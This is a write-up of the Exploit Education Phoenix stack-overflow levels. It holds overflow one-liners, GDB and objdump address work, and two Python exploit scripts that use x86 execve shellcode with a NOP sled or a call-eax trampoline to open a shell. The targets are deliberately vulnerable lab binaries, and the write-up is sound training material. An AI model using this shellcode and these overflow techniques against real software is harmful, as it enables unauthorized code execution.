# Phoenix (Exploit Education) Write Up

Note that I added `/opt/phoenix/i486/` to the `PATH` env variable so that we avoid typing the whole path each time we have to launch the executable of a level.

## Stack Zero

We can overflow the buffer variable to modify the variable using `echo $(python -c 'print "\xFF"*65') | stack-zero`.

## Stack One

Same trick here, but we have to specify a value. We use `stack-one $(python -c 'print "\xFF"*64 + "\x49\x6c\x59\x62"[::-1]')`.

Note that we reverse the order of the hex value to handle the endianness.

## Stack Two

It's the same thing as `stack-one`, except we put the value in the env variable instead of passing it as an argument: `ExploitEducation=$(python -c 'print "\xFF"*64 + "\x0d\x0a\x09\x0a"[::-1]') stack-two`.

## Stack Three

We get the address of the `complete-level()` function using obj-dump:

```bash
user@phoenix-amd64:~$ objdump -d /opt/phoenix/i486/stack-three
[...]
08048535 <complete_level>:
 8048535:	55                   	push   %ebp
 8048536:	89 e5                	mov    %esp,%ebp
 8048538:	83 ec 08             	sub    $0x8,%esp
[...]
```

Here the function resides at address `0x08048535`. We then use the same trick as in the previous levels and can execute the command `echo $(python -c 'print "\xFF"*64 + "\x08\x04\x85\x35"[::-1]') | stack-three` to finish the level.

## Stack Four

Here we'll overflow the buffer until it overwrites the return address (as it's pushed to the stack when a function is called). We determine the address of the `complete-level()` function as in Stack Three (in this case it's `0x080484e5` ). We can then execute `echo $(python -c 'print "\x08\x04\x84\xe5"[::-1]*21') | stack-four` to finish the level.

Here, we see that we need to repeat the string at least 16 times to fill the buffer. We then have to "pass" over the remaining things that resides on the stack (such as the `ret` variable, the saved `ebp`, and so on) until we overwrite the return address. This is where the 21 factor comes from. Also, as the buffer is memory aligned, we don't have to take care of adding padding to our string.

## Stack Five

##### Method 1

My first idea was to put the shellcode at the beginning of the `buffer` array, and then overflow the rest of the array with the address of the first element of the array. This way, when the function `start_level()` will return, it will jump to the beginning of the array and start executing the shellcode. The problem is that the addresses of the beginning of the array in GDB and during a "normal" launch are not exactly the same, typically due to environnement variables, and so on. Thus, what we can do instead is fill all the beginning of the array with NOP opcode (which does nothing), then add the shellcode at the very end of the array and finally overflow the array with an approximation of the address of the beggining of the array. This way, even if we are not 100% accurate, we will fall in the NOP section and eventually end up executing our shellcode.

 We thus first need to compute tapproximatively he address of the `buffer` array. By decompiling the function `start_level()`  we get how the array pointer is passed to the function `gets()`:

```bash
[...]
   0x08048491 <+12>:	lea    eax,[ebp-0x88]
   0x08048497 <+18>:	push   eax
   0x08048498 <+19>:	call   0x80482c0 <gets@plt>
[...]
```

Using GDB we get that `ebp` is equal to `0xFFFFDE18`. The array address is thus `0xFFFFDE18 - 0x88 = 0xFFFFDD90`. 

Also, shellcodes can be found online. For the architecture I used, I found [this](http://shell-storm.org/shellcode/files/shellcode-841.php) shellcode using the [shell-storm database](http://shell-storm.org/shellcode/). 

We can then write a python script `stack-five.py` that creates our complete string : 

```python
#!/usr/bin/env python
BUFFER_SIZE = 128
shellcode = bytearray("\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f"    								"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd"
					"\x80")


output = bytearray("\xFF\xFF\xDD\xE0"[::-1] * 40)
for i in range(BUFFER_SIZE - len(shellcode)):
                      output[i] = "\x90"

output[BUFFER_SIZE - len(shellcode):BUFFER_SIZE] = shellcode[:]

print str(output)
```

And start the attack with `cat <(./stack-five.py) - | stack-five `. Note that `cat <(./stack-five.py) -` allows to concatenate the output of our script with `stdin`. This way, once the string will been read by `gets()`, we will still be able to execute command in the shell as `stdin` is concatenated.

##### Method 2

A second, cleaner, method is to use to use the [jump-to-address](https://en.wikipedia.org/wiki/Buffer_overflow#The_jump_to_address_stored_in_a_register_technique) technique. We first notice that at the end of the `start-level()` function the address of the beggining of the buffer is stored in register `eax` (as it's an argument to the `gets()` function). Thus, if we manage to jump to a portion of code that itself jumps at the address stored in `eax`, we'll end up executing whatever is stored at the beginning of the `buffer` array.

To find sucha  portion of code, we dissasemble the executable. This part looks promising :

```bash
[...]
 8048500:	ff d0                	call   *%eax
[...]
```

We thus know we have to return to address `0x08048500`. Once again, we craft a special string composed with our shellcode at the beginning, and then a lot of time the address, so that it overflows the buffer and overwrites the return address of the current function. Here is the final exploit :

```python
#!/usr/bin/env python
shellcode = bytearray("\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f"    								"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd"
					"\x80")

output = bytearray("\x08\x04\x85\x00"[::-1] * 40)
output[:len(shellcode)] = shellcode[:]

print str(output)
```

The shell is then opened using `cat <(./stack-five.py) -| stack-five`.

## Stack Six

We can change only the last byte of the saved EBP (byte of least value).

***TODO***: Continue from Stack Six